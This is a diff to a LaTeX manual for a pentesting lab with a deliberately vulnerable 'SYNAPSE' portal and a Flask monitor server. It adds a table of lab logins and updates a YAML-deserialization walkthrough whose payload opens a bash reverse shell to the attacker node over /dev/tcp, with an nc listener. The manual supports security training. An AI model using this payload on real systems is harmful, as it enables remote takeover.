@@ -102,7 +102,27 @@ VyOS-LAB2       & eth1         & 192.168.30.1/24                          & Net-
 VyOS-LAB2       & eth2         & 10.0.40.1/24                             & Net-Attackers & Attacker gateway \\
 Server-A        & ens3         & 192.168.30.10/24                         & Net-DMZ       & SYNAPSE Portal \\
 Server-B        & ens3         & 192.168.30.20/24                         & Net-DMZ       & Monitor service \\
-Parrot-Attacker & eth0         & 10.0.40.10/24                            & Net-Attackers & Pentesting node \\
+Parrot-Attacker & ens4         & 10.0.40.5/24                             & Net-Attackers & Pentesting node \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\begin{table}[h!]
+\centering
+\caption{Lab 2 --- access credentials}
+\label{lab2:tab-credentials}
+\begin{tabular}{@{}llll@{}}
+\toprule
+\textbf{System} & \textbf{Username} & \textbf{Password} & \textbf{Access} \\
+\midrule
+pfSense-LAB2    & admin    & pfsense            & VNC 32773 / SSH \\
+VyOS-LAB2       & vyos     & vyos               & Telnet 32770 \\
+Server-A OS     & ubuntu   & S3rv3rA            & SSH 192.168.30.10 \\
+Server-A Portal & admin    & Admin@Synapse2024  & http://192.168.30.10 \\
+Server-A Portal & guest    & guest123           & http://192.168.30.10 \\
+Server-B OS     & ubuntu   & S3rv3rB            & SSH 192.168.30.20 \\
+Server-B DataVault & operator & D4t4V4ult\#2024  & http://192.168.30.20 \\
+Parrot-Attacker & lab2     & L4b2               & SSH 10.0.40.5 \\
 \bottomrule
 \end{tabular}
 \end{table}
@@ -418,7 +438,7 @@ network:
         addresses: [192.168.30.1]
 \end{lstlisting}
 
-The system credentials are \texttt{ubuntu/ubuntu} for the OS user. The
+The system credentials are \texttt{ubuntu/S3rv3rA} for the OS user on Server-A. The
 application runs as the \texttt{synapse} service user
 (\texttt{synapse/Syn@pse2024}).
 
@@ -428,7 +448,7 @@ application runs as the \texttt{synapse} service user
 Server-B runs Ubuntu Server 24.04 and hosts a minimal Flask-based network
 monitoring service. Its network configuration mirrors that of Server-A, with
 a static address of \texttt{192.168.30.20/24} and the same default gateway.
-The system credentials are \texttt{ubuntu/ubuntu}; the monitoring application
+The system credentials are \texttt{ubuntu/S3rv3rB}; the monitoring application
 user is \texttt{monitor/M0nit0r2024}.
 %TODO: Confirm Server-B installation completed (status was "in progress" as of last vault update). Verify SSH access to ubuntu@192.168.30.20.
 
@@ -1173,12 +1193,12 @@ parsed = str(yaml.load(raw, Loader=yaml.UnsafeLoader))
 \paragraph{Exploit payload.}
 \begin{lstlisting}[caption={YAML payload --- reverse shell to Parrot}]
 !!python/object/apply:os.system
-- "bash -c 'bash -i >& /dev/tcp/10.0.40.10/4444 0>&1'"
+- "bash -c 'bash -i >& /dev/tcp/10.0.40.5/4444 0>&1'"
 \end{lstlisting}
 
 \paragraph{Exploit steps.}
 \begin{enumerate}
-    \item Start \texttt{nc -lvnp 4444} on Parrot (\texttt{10.0.40.10}).
+    \item Start \texttt{nc -lvnp 4444} on Parrot (\texttt{10.0.40.5}).
     \item Create \texttt{exploit.yml} with the payload above.
     \item Log in to DataVault as \texttt{operator / D4t4V4ult\#2024}.
     \item Upload \texttt{exploit.yml} and click \textbf{Preview}.
@@ -1194,9 +1214,31 @@ The final flag is \texttt{FLAG\{synapse\_nexus\_exfil\_complete\}} (FLAG~\#3).
 \begin{description}
     \item[F5 --- Parrot static IP.]
           Configure \texttt{nmcli} at session start:
-          \texttt{10.0.40.10/24}, GW \texttt{10.0.40.1}.
+          \texttt{10.0.40.5/24}, GW \texttt{10.0.40.1}.
     \item[F6 --- Full attack walkthrough.]
           End-to-end five-vulnerability chain: XSS \rightarrow{} broken auth
           \rightarrow{} SQLi (FLAG~\#1) \rightarrow{} admin panel (FLAG~\#2)
           \rightarrow{} YAML deserialization \rightarrow{} FLAG~\#3.
 \end{description}
+
+
+% SESION 2026-04-25 --- Passwords actualizados, configs exportadas, Parrot verificado
+\subsubsection{Session 2026-04-25 --- Final Lab Configuration}
+\label{subsubsec:lab2-session-20260425}
+
+This session completed the final configuration of the lab environment:
+
+\begin{itemize}
+    \item \textbf{OS password hardening.}
+          The default \texttt{ubuntu/ubuntu} credentials were replaced:
+          Server-A uses \texttt{S3rv3rA} and Server-B uses \texttt{S3rv3rB}.
+          Parrot SSH access uses \texttt{lab2~/ L4b2}.
+    \item \textbf{Parrot connectivity verified.}
+          Parrot (\texttt{10.0.40.5/24}, interface \texttt{ens4})
+          reaches both DMZ servers via VyOS routing. Tools confirmed:
+          \texttt{nmap}, \texttt{curl}, \texttt{python3},
+          \texttt{nc}, \texttt{sqlmap}.
+    \item \textbf{Application configs exported.}
+          All source files and Docker Compose definitions are backed up
+          to \texttt{src/eve-ng/configs/nodes/Lab2/} in the repository.
+\end{itemize}
